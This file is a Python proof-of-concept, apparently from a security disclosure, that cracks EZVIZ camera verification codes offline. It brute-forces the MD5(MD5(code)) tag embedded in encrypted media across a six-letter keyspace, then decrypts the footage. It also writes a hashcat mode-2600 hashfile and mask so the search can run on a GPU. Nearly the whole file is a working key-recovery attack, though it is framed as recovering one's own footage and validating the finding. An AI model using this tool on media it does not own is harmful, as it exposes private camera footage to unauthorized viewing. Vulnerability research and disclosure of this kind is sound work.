#!/usr/bin/env python3
"""
EZVIZ verification-code recovery PoC  —  demonstrates finding H-2.

The device verification code IS the entire AES key for encrypted media, and every
encrypted blob embeds MD5(MD5(code)) as an integrity tag. That tag is an OFFLINE
ORACLE: you can confirm a guessed code with two MD5 ops, no device or server, no
AES until the final confirm. This PoC recovers the code from a blob you already
hold — legitimately, footage YOU own whose code you've lost / for validating the
weakness in a disclosure report.

It is intentionally single-file and offline. It does not touch any network, device,
or account, and `--selftest` proves it end-to-end on a synthetic blob.

Scaling note (the "GPU" question): the oracle is hashcat mode 2600 = md5(md5($pass)).
`--hashcat` emits a ready hashfile + mask so the same search runs on a GPU at
~10-50 GH/s, which clears the whole 6-char A-Z space (2^28) in well under a second.
See CRACK_ANALYSIS.md for the measured-vs-extrapolated throughput.
"""
import sys, os, time, hashlib, argparse, itertools, struct
from multiprocessing import Pool, cpu_count

# reuse the verified format code from the sibling module
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ezviz_media import parse_header, double_md5_tag, key_from_code, build_blob, decrypt

def extract_tag(data: bytes) -> str:
    """The stored MD5(MD5(code)) hex tag lives at trueData[16:48]."""
    td = parse_header(data)["true_data"]
    if td is None or len(td) < 48:
        raise ValueError("blob too short to contain the MD5^2 tag")
    return td[16:48].decode(errors="replace").lower()

def _md5(b): return hashlib.md5(b).digest()

def _worker(args):
    """Search one first-character shard; return the code if the oracle matches."""
    first, charset, length, target_hex = args
    target = bytes.fromhex(target_hex)
    tail_len = length - 1
    prefix = first.encode()
    tried = 0
    for combo in itertools.product(charset, repeat=tail_len):
        cand = prefix + "".join(combo).encode()
        # oracle: md5( hex(md5(cand)) )
        inner = hashlib.md5(cand).hexdigest().encode()
        if _md5(inner) == target:
            return cand.decode(), tried
        tried += 1
    return None, tried

def crack(data: bytes, charset: str, length: int, procs=None):
    target_hex = extract_tag(data)
    procs = procs or cpu_count()
    shards = [(c, charset, length, target_hex) for c in charset]
    t0 = time.time()
    found, total = None, 0
    with Pool(procs) as pool:
        for res, tried in pool.imap_unordered(_worker, shards):
            total += tried
            if res:
                found = res
                pool.terminate()
                break
    dt = time.time() - t0
    return found, total, dt, target_hex

def bench(charset: str, length: int, sample=3_000_000):
    """Measure real double-MD5 throughput on THIS machine (single core)."""
    t0 = time.time()
    for i in range(sample):
        c = str(i).encode()
        _md5(hashlib.md5(c).hexdigest().encode())
    dt = time.time() - t0
    rate = sample / dt
    space = len(charset) ** length
    return rate, space, dt

def main():
    ap = argparse.ArgumentParser(description="EZVIZ verify-code recovery PoC (offline, H-2)")
    ap.add_argument("file", nargs="?", help="encrypted blob you own")
    ap.add_argument("--charset", default="ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                    help="candidate charset (default A-Z, the usual label code)")
    ap.add_argument("--length", type=int, default=6)
    ap.add_argument("--procs", type=int, default=None)
    ap.add_argument("--selftest", action="store_true",
                    help="generate a synthetic blob and recover its code end-to-end")
    ap.add_argument("--bench", action="store_true", help="measure oracle throughput + estimate full-space time")
    ap.add_argument("--hashcat", metavar="BLOB", help="emit hashcat 2600 hashfile+mask for GPU offload")
    a = ap.parse_args()

    if a.bench:
        rate, space, dt = bench(a.charset, a.length)
        cores = cpu_count()
        print(f"[bench] single-core double-MD5: {rate:,.0f} H/s ({dt:.2f}s for sample)")
        print(f"[bench] est. {cores}-core CPU:    {rate*cores:,.0f} H/s")
        print(f"[bench] keyspace {len(a.charset)}^{a.length} = {space:,} (~2^{space.bit_length()-1})")
        print(f"[bench] worst-case this CPU:     {space/(rate*cores):,.1f} s")
        for label, ghs in (("mid-range GPU", 8e9), ("high-end GPU (hashcat 2600)", 40e9)):
            print(f"[bench] worst-case {label:<26}: {space/ghs*1000:,.2f} ms")
        return

    if a.hashcat:
        data = open(a.hashcat, "rb").read()
        tag = extract_tag(data)
        open("ezviz_h2.hash", "w").write(tag + "\n")
        mask = "?u" * a.length
        print("wrote ezviz_h2.hash (hashcat mode 2600 = md5(md5($pass)))")
        print(f"run:  hashcat -m 2600 -a 3 ezviz_h2.hash {mask}")
        print("      (?u = A-Z; swap ?a/?d/etc. for other code alphabets)")
        return

    if a.selftest:
        code = "ABCDEF"   # early in A-Z^6 -> recovered in <1s even single-shard
        blob = build_blob(b"\xff\xd8\xff top-secret frame payload", code)
        print(f"[selftest] hidden code = {code}; searching {len(a.charset)}^{a.length} space...")
        found, total, dt, tgt = crack(blob, a.charset, a.length, a.procs)
        print(f"[selftest] tag(target)  = {tgt}")
        print(f"[selftest] recovered    = {found}  after {total:,} candidates in {dt:.2f}s")
        if found == code:
            r = decrypt(blob, found)
            print(f"[selftest] decrypt OK   = {r['plaintext']!r}")
            print("[selftest] RESULT: PASS")
            sys.exit(0)
        print("[selftest] RESULT: FAIL"); sys.exit(1)

    if not a.file:
        ap.error("need a blob FILE (or --selftest / --bench / --hashcat)")
    data = open(a.file, "rb").read()
    found, total, dt, tgt = crack(data, a.charset, a.length, a.procs)
    if found:
        print(f"[+] verification code = {found}  ({total:,} tried, {dt:.2f}s)")
        print("    decrypt with: ezviz_media.py <file> -c %s -o out.jpg" % found)
    else:
        print(f"[-] not found in {len(a.charset)}^{a.length} space ({total:,} tried, {dt:.2f}s)")

if __name__ == "__main__":
    main()
